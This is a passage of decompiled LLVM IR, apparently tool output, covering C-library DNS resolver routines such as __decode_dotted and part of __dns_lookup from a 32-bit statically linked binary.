  %v0_80655da = phi i32 [ %tmp3, %entry ], [ %v0_80655e6.pre, %dec_label_pc_80655d7 ]
  %v1_80655e6 = add i32 %v0_80655da, 4
  %v2_80655e6 = inttoptr i32 %v1_80655e6 to i32*
  %v3_80655e6 = load i32, i32* %v2_80655e6, align 4
  %v1_80655e9 = icmp eq i32 %v3_80655e6, 0
  %v1_80655eb = icmp eq i1 %v1_80655e9, false
  br i1 %v1_80655eb, label %dec_label_pc_80655d7, label %dec_label_pc_80655ed

dec_label_pc_80655ed:                             ; preds = %dec_label_pc_80655e6
  %v1_80655ed = inttoptr i32 %v0_80655da to i32*
  %v2_80655ed = load i32, i32* %v1_80655ed, align 4
  %v3_80655ed = icmp eq i32 %v2_80655ed, 0
  %v1_80655f0 = icmp eq i1 %v3_80655ed, false
  br i1 %v1_80655f0, label %dec_label_pc_80655d7, label %dec_label_pc_80655f2

dec_label_pc_80655f2:                             ; preds = %dec_label_pc_80655ed
  %v0_80655f2 = load i32, i32* @esi, align 4
  %v2_80655f7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80655f7, i32* @ebx, align 4
  store i32 %v0_80655ca, i32* @esi, align 4
  %v1_80655f9 = call i32 @free(i32 %v0_80655f2)
  ret i32 %v1_80655f9

; uselistorder directives
  uselistorder i32 %v3_80655e6, { 1, 0 }
  uselistorder i32 %v0_80655da, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80655e6, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8065601 = load i32, i32* @edi, align 4
  %v0_8065602 = load i32, i32* @esi, align 4
  %v4_8065607 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8065607, label %dec_label_pc_80656ce, label %dec_label_pc_8065616

dec_label_pc_8065616:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80656b62541 = add i32 %arg2, %arg1
  %v3_80656b62642 = inttoptr i32 %v2_80656b62541 to i8*
  %v4_80656b62743 = load i8, i8* %v3_80656b62642, align 1
  %v1_80656ba2945 = icmp eq i8 %v4_80656b62743, 0
  %v1_80656bc3046 = icmp eq i1 %v1_80656ba2945, false
  br i1 %v1_80656bc3046, label %dec_label_pc_8065624.lr.ph, label %dec_label_pc_80656c2

dec_label_pc_8065624:                             ; preds = %dec_label_pc_8065624.lr.ph, %dec_label_pc_806563d
  %v0_806562e = phi i32 [ %v0_806562e.pre, %dec_label_pc_8065624.lr.ph ], [ %v4_806564e, %dec_label_pc_806563d ]
  %v8_806562437 = phi i1 [ %v8_80656243151, %dec_label_pc_8065624.lr.ph ], [ true, %dec_label_pc_806563d ]
  %v5_80656b636.in = phi i8 [ %v5_80656b62850.in, %dec_label_pc_8065624.lr.ph ], [ %v4_80656b6, %dec_label_pc_806563d ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8065624.lr.ph ], [ 0, %dec_label_pc_806563d ]
  %v0_806562b34 = phi i32 [ %v0_806562b.ph47, %dec_label_pc_8065624.lr.ph ], [ %v2_806565c, %dec_label_pc_806563d ]
  %v5_80656b636 = zext i8 %v5_80656b636.in to i32
  %v1_806562b = add i32 %v0_806562b34, 1
  store i32 %v1_806562b, i32* @esi, align 4
  %v3_806562e = select i1 %v8_806562437, i32 2, i32 1
  %v4_806562e = add i32 %v3_806562e, %v0_806562e
  store i32 %v4_806562e, i32* %ebp.global-to-local, align 4
  %v1_8065631 = and i32 %v5_80656b636, 192
  %v6_8065636 = icmp eq i32 %v1_8065631, 192
  %v1_806563b = icmp eq i1 %v6_8065636, false
  br i1 %v1_806563b, label %dec_label_pc_8065660, label %dec_label_pc_806563d

dec_label_pc_806563d:                             ; preds = %dec_label_pc_8065624
  %v2_806564a = add i32 %v1_806562b, %arg1
  %v3_806564a = inttoptr i32 %v2_806564a to i8*
  %v4_806564a = load i8, i8* %v3_806564a, align 1
  %v5_806564a = zext i8 %v4_806564a to i32
  %v4_806564e = add i32 %v3_806562e, %v4_806562e
  store i32 %v4_806564e, i32* %ebp.global-to-local, align 4
  %v1_8065651 = mul nuw nsw i32 %v5_80656b636, 256
  %v2_8065654 = and i32 %v1_8065651, 16128
  %v2_806565c = or i32 %v5_806564a, %v2_8065654
  store i32 %v2_806565c, i32* @edx, align 4
  store i32 %v1_806567d.ph48, i32* @ecx, align 4
  %v2_80656b6 = add i32 %v2_806565c, %arg1
  %v3_80656b6 = inttoptr i32 %v2_80656b6 to i8*
  %v4_80656b6 = load i8, i8* %v3_80656b6, align 1
  %v1_80656ba = icmp eq i8 %v4_80656b6, 0
  %v1_80656bc = icmp eq i1 %v1_80656ba, false
  br i1 %v1_80656bc, label %dec_label_pc_8065624, label %dec_label_pc_80656c2

dec_label_pc_8065660:                             ; preds = %dec_label_pc_8065624
  %v2_8065660 = add i32 %v5_80656b636, %v1_806567d.ph48
  %v1_8065665 = add i32 %v2_8065660, 1
  store i32 %v1_8065665, i32* @edi, align 4
  %v10_8065666 = icmp ult i32 %v1_8065665, %arg4
  %v1_806566e = icmp eq i1 %v10_8065666, false
  br i1 %v1_806566e, label %dec_label_pc_80656ce, label %dec_label_pc_8065670

dec_label_pc_8065670:                             ; preds = %dec_label_pc_8065660
  %v2_8065676 = add i32 %v1_806562b, %arg1
  %v2_806567d = add i32 %v1_806567d.ph48, %arg3
  %v3_8065680 = inttoptr i32 %v2_806567d to i16*
  %v4_8065680 = call i32 @memcpy(i16* %v3_8065680, i32 %v2_8065676, i32 %v5_80656b636)
  %v0_806568c = load i32, i32* %ebp.global-to-local, align 4
  %v0_8065695 = load i32, i32* @esi, align 4
  %v2_8065695 = add i32 %v0_8065695, %v5_80656b636
  store i32 %v2_8065695, i32* @edx, align 4
  %v1_806569c = icmp eq i1 %v8_806562437, false
  %v2_806568c = select i1 %v1_806569c, i32 %v5_80656b636, i32 0
  %v4_806569c = add i32 %v0_806568c, %v2_806568c
  store i32 %v4_806569c, i32* %ebp.global-to-local, align 4
  %v4_80656ad = add i32 %v2_8065660, %arg3
  %v5_80656ad = inttoptr i32 %v4_80656ad to i8*
  store i8 46, i8* %v5_80656ad, align 1
  %v0_80656b0.pre = load i32, i32* @edi, align 4
  %v1_80656b6.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80656b0.pre, i32* @ecx, align 4
  %v2_80656b625 = add i32 %v1_80656b6.pre.pre, %arg1
  %v3_80656b626 = inttoptr i32 %v2_80656b625 to i8*
  %v4_80656b627 = load i8, i8* %v3_80656b626, align 1
  %v1_80656ba29 = icmp eq i8 %v4_80656b627, 0
  %v1_80656bc30 = icmp eq i1 %v1_80656ba29, false
  %v8_806562431 = icmp eq i8 %stack_var_-17.135, 0
  %v0_806562e.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80656bc30, label %dec_label_pc_8065624.lr.ph, label %dec_label_pc_80656c2

dec_label_pc_8065624.lr.ph:                       ; preds = %dec_label_pc_8065670, %dec_label_pc_8065616
  %v0_806562e.pre = phi i32 [ 0, %dec_label_pc_8065616 ], [ %v0_806562e.pre.pre, %dec_label_pc_8065670 ]
  %v8_80656243151 = phi i1 [ false, %dec_label_pc_8065616 ], [ %v8_806562431, %dec_label_pc_8065670 ]
  %v5_80656b62850.in = phi i8 [ %v4_80656b62743, %dec_label_pc_8065616 ], [ %v4_80656b627, %dec_label_pc_8065670 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8065616 ], [ %stack_var_-17.135, %dec_label_pc_8065670 ]
  %v1_806567d.ph48 = phi i32 [ 0, %dec_label_pc_8065616 ], [ %v0_80656b0.pre, %dec_label_pc_8065670 ]
  %v0_806562b.ph47 = phi i32 [ %arg2, %dec_label_pc_8065616 ], [ %v1_80656b6.pre.pre, %dec_label_pc_8065670 ]
  br label %dec_label_pc_8065624

dec_label_pc_80656c2:                             ; preds = %dec_label_pc_8065670, %dec_label_pc_806563d, %dec_label_pc_8065616
  %v0_80656c7 = phi i32 [ 0, %dec_label_pc_8065616 ], [ %v4_806564e, %dec_label_pc_806563d ], [ %v0_806562e.pre.pre, %dec_label_pc_8065670 ]
  %v8_8065624.lcssa = phi i1 [ false, %dec_label_pc_8065616 ], [ true, %dec_label_pc_806563d ], [ %v8_806562431, %dec_label_pc_8065670 ]
  %v2_80656c9 = zext i1 %v8_8065624.lcssa to i32
  %v3_80656c9 = add i32 %v0_80656c7, 1
  %v4_80656c9 = add i32 %v3_80656c9, %v2_80656c9
  br label %dec_label_pc_80656d1

dec_label_pc_80656ce:                             ; preds = %dec_label_pc_8065660, %entry
  br label %dec_label_pc_80656d1

dec_label_pc_80656d1:                             ; preds = %dec_label_pc_80656c2, %dec_label_pc_80656ce
  %storemerge = phi i32 [ %v4_80656c9, %dec_label_pc_80656c2 ], [ -1, %dec_label_pc_80656ce ]
  store i32 %v0_8065602, i32* @esi, align 4
  store i32 %v0_8065601, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_806567d.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_80656b6, { 1, 0 }
  uselistorder i32 %v2_806565c, { 0, 2, 1 }
  uselistorder i32 %v4_806564e, { 0, 2, 1 }
  uselistorder i32 %v5_80656b636, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 46, { 6, 8, 0, 7, 5, 1, 2, 3, 4 }
  uselistorder i1 true, { 2, 11, 16, 17, 25, 18, 19, 20, 13, 21, 22, 23, 15, 24, 3, 4, 5, 6, 7, 8, 14, 0, 12, 1, 9, 10 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80656d1, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_80656f2 = call i32 @malloc(i32 512)
  store i32 %v2_80656f2, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_80656f2, i32* @ebp, align 4
  %v2_8065700 = call i32 @malloc(i32 1025)
  store i32 %v2_8065700, i32* %eax.global-to-local, align 4
  %v12_8065709 = ptrtoint i32* %stack_var_-236 to i32
  %v1_806570c = icmp eq i32 %v2_80656f2, 0
  br i1 %v1_806570c, label %dec_label_pc_8065d85, label %dec_label_pc_8065714

dec_label_pc_8065714:                             ; preds = %entry
  %v1_8065714 = icmp eq i32 %v2_8065700, 0
  br i1 %v1_8065714, label %dec_label_pc_8065d85, label %dec_label_pc_806571c

dec_label_pc_806571c:                             ; preds = %dec_label_pc_8065714
  %v5_806571c = icmp eq i32 %arg2, 0
  br i1 %v5_806571c, label %dec_label_pc_8065d85, label %dec_label_pc_806572a

dec_label_pc_806572a:                             ; preds = %dec_label_pc_806571c
  %v4_806572a = ptrtoint i8* %arg1 to i32
  store i32 %v4_806572a, i32* %eax.global-to-local, align 4
  %v2_8065731 = load i8, i8* %arg1, align 1
  %v3_8065731 = icmp eq i8 %v2_8065731, 0
  br i1 %v3_8065731, label %dec_label_pc_8065d85, label %dec_label_pc_806573a

dec_label_pc_806573a:                             ; preds = %dec_label_pc_806572a
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_806573e = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_806573e, i32* %eax.global-to-local, align 4
  store i32 %v4_806572a, i32* %edx.global-to-local, align 4
  %v2_8065761 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8065761, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v6_8065769 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134589241, i32 ptrtoint (i8** @global_var_807e05c.771 to i32))
  store i32 %v6_8065769, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_807e05c.771 to i8*), i8** %stack_var_-252, align 4
  %v2_8065775 = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_807e05c.771 to i32))
  %v0_806577a = load i64, i64* @global_var_807e074.772, align 8
  %v1_806577a = trunc i64 %v0_806577a to i32
  %v1_806577f = ashr i32 %v1_806577a, 31
  %v6_8065780 = and i64 %v0_806577a, 4294967295
  %v8_8065780 = zext i32 %v1_806577f to i64
  %v9_8065780 = mul nuw i64 %v8_8065780, 4294967296
  %v10_8065780 = or i64 %v9_8065780, %v6_8065780
  %v14_8065780 = srem i64 %v10_8065780, %tmp33
  %v15_8065780 = trunc i64 %v14_8065780 to i32
  %v0_8065787 = load i16, i16* @global_var_807567c.773, align 4
  %v2_8065796 = load i8*, i8** %stack_var_-252, align 4
  %v3_8065796 = ptrtoint i8* %v2_8065796 to i32
  store i32 %v3_8065796, i32* %eax.global-to-local, align 4
  store i32 134589241, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v4_806579b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_806579b, i32* %eax.global-to-local, align 4
  %v3_8065942 = inttoptr i32 %v15_8065780 to i8*
  %v1_8065d6072 = add i32 %v12_8065709, 28
  %v2_8065d6073 = inttoptr i32 %v1_8065d6072 to i32*
  %v3_8065d6074 = load i32, i32* %v2_8065d6073, align 4
  %tmp = icmp ult i32 %v3_8065d6074, 3
  br i1 %tmp, label %dec_label_pc_80657c0, label %dec_label_pc_8065d85

dec_label_pc_80657c0:                             ; preds = %dec_label_pc_806573a, %dec_label_pc_8065d60.backedge
  %v0_80657c783 = phi i32 [ %v0_8065d60.pre, %dec_label_pc_8065d60.backedge ], [ %v12_8065709, %dec_label_pc_806573a ]
  %v1_80657c0 = add i32 %v0_80657c783, 20
  %v2_80657c0 = inttoptr i32 %v1_80657c0 to i32*
  %v3_80657c0 = load i32, i32* %v2_80657c0, align 4
  %v13_80657c0 = icmp eq i32 %v3_80657c0, -1
  br i1 %v13_80657c0, label %dec_label_pc_80657c0.dec_label_pc_80657d6_crit_edge, label %dec_label_pc_80657c7

dec_label_pc_80657c0.dec_label_pc_80657d6_crit_edge: ; preds = %dec_label_pc_80657c0
  %v0_80657d6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80657d6

dec_label_pc_80657c7:                             ; preds = %dec_label_pc_80657c0
  %v3_80657ca = load i32, i32* %v2_80657c0, align 4
  %v5_80657ca = add i32 %v0_80657c783, -16
  %v6_80657ca = inttoptr i32 %v5_80657ca to i32*
  store i32 %v3_80657ca, i32* %v6_80657ca, align 4
  %v1_80657ce = call i32 @__libc_close(i32 -1)
  store i32 %v1_80657ce, i32* %eax.global-to-local, align 4
  %v0_80657d3 = load i32, i32* @esp, align 4
  %v1_80657d3 = add i32 %v0_80657d3, 16
  br label %dec_label_pc_80657d6

dec_label_pc_80657d6:                             ; preds = %dec_label_pc_80657c0.dec_label_pc_80657d6_crit_edge, %dec_label_pc_80657c7
  %v1_80657d6 = phi i32 [ %v0_80657c783, %dec_label_pc_80657c0.dec_label_pc_80657d6_crit_edge ], [ %v1_80657d3, %dec_label_pc_80657c7 ]
  %v0_80657d6 = phi i32 [ %v0_80657d6.pre, %dec_label_pc_80657c0.dec_label_pc_80657d6_crit_edge ], [ %v1_80657ce, %dec_label_pc_80657c7 ]
  %v2_80657d6 = add i32 %v1_80657d6, -4
  %v3_80657d6 = inttoptr i32 %v2_80657d6 to i32*
  store i32 %v0_80657d6, i32* %v3_80657d6, align 4
  %v1_80657d7 = add i32 %v1_80657d6, -8
  %v2_80657d7 = inttoptr i32 %v1_80657d7 to i32*
  store i32 512, i32* %v2_80657d7, align 4
  %v1_80657dc = add i32 %v1_80657d6, -12
  %v2_80657dc = inttoptr i32 %v1_80657dc to i32*
  store i32 0, i32* %v2_80657dc, align 4
  %v2_80657de = add i32 %v1_80657d6, -16
  %v3_80657de = inttoptr i32 %v2_80657de to i32*
  store i32 %v2_80656f2, i32* %v3_80657de, align 4
  %v4_80657df = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80657df, i32* %eax.global-to-local, align 4
  %v0_80657e4 = load i32, i32* @esp, align 4
  %v1_80657e7 = add i32 %v0_80657e4, 8
  %v2_80657e7 = inttoptr i32 %v1_80657e7 to i32*
  store i32 48, i32* %v2_80657e7, align 4
  %v1_80657e9 = add i32 %v0_80657e4, 4
  %v2_80657e9 = inttoptr i32 %v1_80657e9 to i32*
  store i32 0, i32* %v2_80657e9, align 4
  %v1_80657eb = add i32 %v0_80657e4, 84
  store i32 %v1_80657eb, i32* @ebx, align 4
  %v3_80657ef = inttoptr i32 %v0_80657e4 to i32*
  store i32 %v1_80657eb, i32* %v3_80657ef, align 4
  %v4_80657f0 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80657f0, i32* %eax.global-to-local, align 4
  %v0_80657f5 = load i32, i32* @esp, align 4
  %v1_80657f5 = add i32 %v0_80657f5, 72
  %v2_80657f5 = inttoptr i32 %v1_80657f5 to i32*
  %v3_80657f5 = load i32, i32* %v2_80657f5, align 4
  store i32 %v3_80657f5, i32* %eax.global-to-local, align 4
  %v1_80657f9 = add i32 %v0_80657f5, 116
  %v2_80657f9 = inttoptr i32 %v1_80657f9 to i32*
  store i32 1, i32* %v2_80657f9, align 4
  %v0_8065801 = load i32, i32* @esp, align 4
  %v1_8065801 = add i32 %v0_8065801, 104
  %v2_8065801 = inttoptr i32 %v1_8065801 to i32*
  store i32 1, i32* %v2_8065801, align 4
  %v0_8065809 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065809 = add i32 %v0_8065809, 1
  %v1_806580a = urem i32 %v1_8065809, 65536
  store i32 %v1_806580a, i32* %eax.global-to-local, align 4
  %v1_806580f = load i32, i32* @esp, align 4
  %v2_806580f = add i32 %v1_806580f, 72
  %v3_806580f = inttoptr i32 %v2_806580f to i32*
  store i32 %v1_806580a, i32* %v3_806580f, align 4
  %v0_8065813 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065813 = load i32, i32* @esp, align 4
  %v2_8065813 = add i32 %v1_8065813, 84
  %v3_8065813 = inttoptr i32 %v2_8065813 to i32*
  store i32 %v0_8065813, i32* %v3_8065813, align 4
  %v0_8065817 = load i32, i32* @esp, align 4
  %v1_806581a = add i32 %v0_8065817, 8
  %v2_806581a = inttoptr i32 %v1_806581a to i32*
  store i32 512, i32* %v2_806581a, align 4
  %v2_806581f = add i32 %v0_8065817, 4
  %v3_806581f = inttoptr i32 %v2_806581f to i32*
  store i32 %v2_80656f2, i32* %v3_806581f, align 4
  %v0_8065820 = load i32, i32* @ebx, align 4
  %v3_8065820 = inttoptr i32 %v0_8065817 to i32*
  store i32 %v0_8065820, i32* %v3_8065820, align 4
  %v0_8065821 = call i32 @__encode_header()
  store i32 %v0_8065821, i32* %eax.global-to-local, align 4
  %v0_8065826 = load i32, i32* @esp, align 4
  %v2_8065829 = icmp slt i32 %v0_8065821, 0
  store i32 %v0_8065821, i32* @ebx, align 4
  br i1 %v2_8065829, label %dec_label_pc_8065d85, label %dec_label_pc_8065833

dec_label_pc_8065833:                             ; preds = %dec_label_pc_80657d6
  %v2_8065833 = add i32 %v0_8065826, 12
  %v3_8065833 = inttoptr i32 %v2_8065833 to i32*
  store i32 %v0_8065821, i32* %v3_8065833, align 4
  %v1_8065834 = add i32 %v0_8065826, 8
  %v2_8065834 = inttoptr i32 %v1_8065834 to i32*
  store i32 1025, i32* %v2_8065834, align 4
  %v1_8065839 = add i32 %v0_8065826, 256
  %v2_8065839 = inttoptr i32 %v1_8065839 to i32*
  %v3_8065839 = load i32, i32* %v2_8065839, align 4
  %v5_8065839 = add i32 %v0_8065826, 4
  %v6_8065839 = inttoptr i32 %v5_8065839 to i32*
  store i32 %v3_8065839, i32* %v6_8065839, align 4
  %v1_8065840 = add i32 %v0_8065826, 28
  %v2_8065840 = inttoptr i32 %v1_8065840 to i32*
  %v3_8065840 = load i32, i32* %v2_8065840, align 4
  %v6_8065840 = inttoptr i32 %v0_8065826 to i32*
  store i32 %v3_8065840, i32* %v6_8065840, align 4
  %v4_8065844 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  %v0_8065849 = load i32, i32* @esp, align 4
  %v1_806584c = add i32 %v0_8065849, 8
  %v2_806584c = inttoptr i32 %v1_806584c to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v2_806584c, align 4
  %v1_8065851 = add i32 %v0_8065849, 4
  %v2_8065851 = inttoptr i32 %v1_8065851 to i32*
  store i32 134589241, i32* %v2_8065851, align 4
  %v1_8065856 = add i32 %v0_8065849, 200
  store i32 %v1_8065856, i32* %eax.global-to-local, align 4
  %v3_806585d = inttoptr i32 %v0_8065849 to i32*
  store i32 %v1_8065856, i32* %v3_806585d, align 4
  %v4_806585e = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_806585e, i32* %eax.global-to-local, align 4
  %v0_8065863 = load i32, i32* @esp, align 4
  %v1_8065863 = inttoptr i32 %v0_8065863 to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v1_8065863, align 4
  %v1_806586a = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_806586a, i32* %eax.global-to-local, align 4
  %v0_806586f = load i32, i32* @esp, align 4
  %v1_806586f = add i32 %v0_806586f, 56
  %v2_806586f = inttoptr i32 %v1_806586f to i32*
  %v3_806586f = load i32, i32* %v2_806586f, align 4
  store i32 %v3_806586f, i32* %edx.global-to-local, align 4
  %v1_8065873 = add i32 %v0_806586f, 268
  %v2_8065873 = inttoptr i32 %v1_8065873 to i32*
  %v3_8065873 = load i32, i32* %v2_8065873, align 4
  store i32 %v3_8065873, i32* %eax.global-to-local, align 4
  %v2_806587a = mul i32 %v3_806586f, 4
  %v3_806587a = add i32 %v3_8065873, %v2_806587a
  %v4_806587a = inttoptr i32 %v3_806587a to i32*
  %v5_806587a = load i32, i32* %v4_806587a, align 4
  store i32 %v5_806587a, i32* %edx.global-to-local, align 4
  %v2_806587d = add i32 %v0_806586f, 48
  %v3_806587d = inttoptr i32 %v2_806587d to i32*
  store i32 %v5_806587a, i32* %v3_806587d, align 4
  %v0_8065881 = load i32, i32* @esp, align 4
  %v1_8065881 = add i32 %v0_8065881, 16
  %v1_8065884 = add i32 %v0_8065881, 52
  %v2_8065884 = inttoptr i32 %v1_8065884 to i32*
  %v3_8065884 = load i32, i32* %v2_8065884, align 4
  %v5_8065884 = icmp slt i32 %v3_8065884, 0
  br i1 %v5_8065884, label %dec_label_pc_8065833.dec_label_pc_80658ca_crit_edge, label %dec_label_pc_806588b

dec_label_pc_8065833.dec_label_pc_80658ca_crit_edge: ; preds = %dec_label_pc_8065833
  %v0_80658ca.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80658ca

dec_label_pc_806588b:                             ; preds = %dec_label_pc_8065833
  store i32 %v3_8065884, i32* %eax.global-to-local, align 4
  %v1_806588f = load i32, i32* @global_var_807f844.774, align 4
  %v2_806588f = sub i32 %v3_8065884, %v1_806588f
  %v8_806588f = xor i32 %v1_806588f, %v3_8065884
  %v9_806588f = xor i32 %v2_806588f, %v3_8065884
  %v10_806588f = and i32 %v9_806588f, %v8_806588f
  %v11_806588f = icmp slt i32 %v10_806588f, 0
  %v13_806588f = icmp slt i32 %v2_806588f, 0
  %v2_8065895 = icmp eq i1 %v13_806588f, %v11_806588f
  br i1 %v2_8065895, label %dec_label_pc_80658ca, label %dec_label_pc_8065897

dec_label_pc_8065897:                             ; preds = %dec_label_pc_806588b
  %v2_8065897 = add i32 %v0_8065881, 12
  %v3_8065897 = inttoptr i32 %v2_8065897 to i32*
  store i32 %v3_8065884, i32* %v3_8065897, align 4
  %v1_8065898 = add i32 %v0_8065881, 8
  %v2_8065898 = inttoptr i32 %v1_8065898 to i32*
  store i32 1025, i32* %v2_8065898, align 4
  %v1_806589d = add i32 %v0_8065881, 4
  %v2_806589d = inttoptr i32 %v1_806589d to i32*
  store i32 ptrtoint (i32* @global_var_806e5a6.775 to i32), i32* %v2_806589d, align 4
  %v1_80658a2 = add i32 %v0_8065881, 28
  %v2_80658a2 = inttoptr i32 %v1_80658a2 to i32*
  %v3_80658a2 = load i32, i32* %v2_80658a2, align 4
  %v6_80658a2 = inttoptr i32 %v0_8065881 to i32*
  store i32 %v3_80658a2, i32* %v6_80658a2, align 4
  %v0_80658a6 = call i32 @__GI_strncat()
  store i32 %v0_80658a6, i32* %eax.global-to-local, align 4
  %v0_80658ab = load i32, i32* @esp, align 4
  %v1_80658ae = add i32 %v0_80658ab, 8
  %v2_80658ae = inttoptr i32 %v1_80658ae to i32*
  store i32 1025, i32* %v2_80658ae, align 4
  %v1_80658b3 = add i32 %v0_80658ab, 52
  %v2_80658b3 = inttoptr i32 %v1_80658b3 to i32*
  %v3_80658b3 = load i32, i32* %v2_80658b3, align 4
  store i32 %v3_80658b3, i32* %edx.global-to-local, align 4
  %v1_80658b7 = mul i32 %v3_80658b3, 4
  %v2_80658b7 = add i32 %v1_80658b7, 134740004
  %v3_80658b7 = inttoptr i32 %v2_80658b7 to i32*
  %v4_80658b7 = load i32, i32* %v3_80658b7, align 4
  %v6_80658b7 = add i32 %v0_80658ab, 4
  %v7_80658b7 = inttoptr i32 %v6_80658b7 to i32*
  store i32 %v4_80658b7, i32* %v7_80658b7, align 4
  %v1_80658be = add i32 %v0_80658ab, 28
  %v2_80658be = inttoptr i32 %v1_80658be to i32*
  %v3_80658be = load i32, i32* %v2_80658be, align 4
  %v6_80658be = inttoptr i32 %v0_80658ab to i32*
  store i32 %v3_80658be, i32* %v6_80658be, align 4
  %v0_80658c2 = call i32 @__GI_strncat()
  store i32 %v0_80658c2, i32* %eax.global-to-local, align 4
  %v0_80658c7 = load i32, i32* @esp, align 4
  %v1_80658c7 = add i32 %v0_80658c7, 16
  br label %dec_label_pc_80658ca

dec_label_pc_80658ca:                             ; preds = %dec_label_pc_8065833.dec_label_pc_80658ca_crit_edge, %dec_label_pc_806588b, %dec_label_pc_8065897
  %v1_80658ca = phi i32 [ %v1_8065881, %dec_label_pc_8065833.dec_label_pc_80658ca_crit_edge ], [ %v1_8065881, %dec_label_pc_806588b ], [ %v1_80658c7, %dec_label_pc_8065897 ]
  %v0_80658ca = phi i32 [ %v0_80658ca.pre, %dec_label_pc_8065833.dec_label_pc_80658ca_crit_edge ], [ %v3_8065884, %dec_label_pc_806588b ], [ %v0_80658c2, %dec_label_pc_8065897 ]
  %v2_80658ca = add i32 %v1_80658ca, -4
  %v3_80658ca = inttoptr i32 %v2_80658ca to i32*
  store i32 %v0_80658ca, i32* %v3_80658ca, align 4
  %v0_80658cb = load i32, i32* %eax.global-to-local, align 4
  %v2_80658cb = add i32 %v1_80658ca, -8
  %v3_80658cb = inttoptr i32 %v2_80658cb to i32*
  store i32 %v0_80658cb, i32* %v3_80658cb, align 4
  %v1_80658cc = add i32 %v1_80658ca, -12
  %v2_80658cc = inttoptr i32 %v1_80658cc to i32*
  store i32 1, i32* %v2_80658cc, align 4
  %v1_80658ce = add i32 %v1_80658ca, 184
  store i32 %v1_80658ce, i32* %eax.global-to-local, align 4
  %v2_80658d5 = add i32 %v1_80658ca, -16
  %v3_80658d5 = inttoptr i32 %v2_80658d5 to i32*
  store i32 %v1_80658ce, i32* %v3_80658d5, align 4
  %v3_80658d6 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780)
  store i32 %v3_80658d6, i32* %eax.global-to-local, align 4
  %v0_80658db = load i32, i32* @esp, align 4
  %v1_80658db = add i32 %v0_80658db, 28
  %v2_80658db = inttoptr i32 %v1_80658db to i32*
  %v3_80658db = load i32, i32* %v2_80658db, align 4
  store i32 %v3_80658db, i32* %eax.global-to-local, align 4
  %v1_80658df = add i32 %v0_80658db, 260
  %v2_80658df = inttoptr i32 %v1_80658df to i32*
  %v3_80658df = load i32, i32* %v2_80658df, align 4
  store i32 %v3_80658df, i32* @edx, align 4
  %v1_80658e6 = add i32 %v0_80658db, 224
  %v2_80658e6 = inttoptr i32 %v1_80658e6 to i32*
  store i32 1, i32* %v2_80658e6, align 4
  %v0_80658f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80658f1 = load i32, i32* @esp, align 4
  %v2_80658f1 = add i32 %v1_80658f1, 216
  %v3_80658f1 = inttoptr i32 %v2_80658f1 to i32*
  store i32 %v0_80658f1, i32* %v3_80658f1, align 4
  %v1_80658fd = load i32, i32* @ebx, align 4
  %v2_80658fd = sub i32 512, %v1_80658fd
  store i32 %v2_80658fd, i32* %eax.global-to-local, align 4
  %v0_80658ff = load i32, i32* @edx, align 4
  %v1_80658ff = load i32, i32* @esp, align 4
